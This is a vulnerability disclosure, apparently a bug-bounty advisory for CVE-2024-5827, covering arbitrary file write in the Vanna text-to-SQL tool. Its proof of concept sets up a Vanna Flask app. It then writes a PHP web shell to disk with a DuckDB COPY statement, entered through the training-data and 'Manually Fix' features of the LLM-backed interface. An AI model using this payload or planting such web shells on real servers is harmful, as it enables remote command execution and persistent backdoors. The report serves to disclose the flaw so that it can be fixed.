Title: Arbitrary File Write by Prompt Injection via DuckDB SQL in vanna-ai/vanna

Proof of Concept: 
Step 1, the victim server runs the following Python scripts to set up Vanna and Flask web API on DuckDB. This set-up Python script is mostly copied from Vanna's official documentation for DuckDB.

import vanna
from vanna.remote import VannaDefault
vn = VannaDefault(model='bug_test', api_key='your API key')
vn.connect_to_duckdb(url=':memory:')

# The information schema query may need some tweaking depending on your database. This is a good starting point.
df_information_schema = vn.run_sql("SELECT * FROM INFORMATION_SCHEMA.COLUMNS")

# This will break up the information schema into bite-sized chunks that can be referenced by the LLM
plan = vn.get_training_plan_generic(df_information_schema)
plan

# If you like the plan, then uncomment this and run it to train
# vn.train(plan=plan)

# The following are methods for adding training data. Make sure you modify the examples to match your database.

# DDL statements are powerful because they specify table names, colume names, types, and potentially relationships
vn.train(ddl="""
    CREATE TABLE IF NOT EXISTS my-table (
        id INT PRIMARY KEY,
        name VARCHAR(100),
        age INT
    )
""")

# Sometimes you may want to add documentation about your business terminology or definitions.
vn.train(documentation="Our business defines OTIF score as the percentage of orders that are delivered on time and in full")

# You can also add SQL queries to your training data. This is useful if you have some queries already laying around. You can just copy and paste those from your editor to begin generating new SQL.
vn.train(sql="SELECT * FROM my-table WHERE name = 'John Doe'")

from vanna.flask import VannaFlaskApp
VannaFlaskApp(vn).run()

Step 2, the attacker user can visit the Flask website by http://[your ip]:8084/, and then navigate to "Add Training data" to add a SQL with the contents COPY (SELECT '<?php system($_GET[0]); ?>' AS '<?php system($_GET[0]); ?>') TO '/tmp/backdoor.php'.





Step 3, the attacker then navigates to add a new question "What SQL query can be used to create a backdoor in a web application?". Note that, the question is generated by the LLM automatically when you add the training data in Vanna, so you may have another question in your reproducing. But no matter which questions are generated by the Vanna, you can simply copy it to "+ New question" button in the Web UI.



It is likely that Vanna cannot correctly generate the intended SQL query for the question, but it does not matter since Vanna supports the "Manually Fix" button. You can click it and then paste your malicious SQL there.



Afterwards, press the "Run SQL" button to execute it. This time, you may still get a "no attribute to_df" error on the Web.



But this is not a problem, the backdoor.php with contents <?php system($_GET[0]); ?> has been successfully created on the disk.

Impact: 
An unauthenticated attacker could use this bug to create arbitrary files on the victim server's hard disk and then get command execution on the machine or leave backdoors.

CVE ID: CVE-2024-5827
Status: (published)
Vulnerability Type: CWE-434: Unrestricted Upload of File with Dangerous Type
Severity: Critical (9.8)
Attack Vector: Network
Attack Complexity: Low
Privileges Required: None
User Interaction: None
Scope: Unchanged
Confidentiality: High
Integrity: High
Availability: High
Registry: Pypi
Affected Version: v0.3.4
Visibility: Public
Status: Awaiting fix
Disclosure Bounty: $900
Fix Bounty: $225
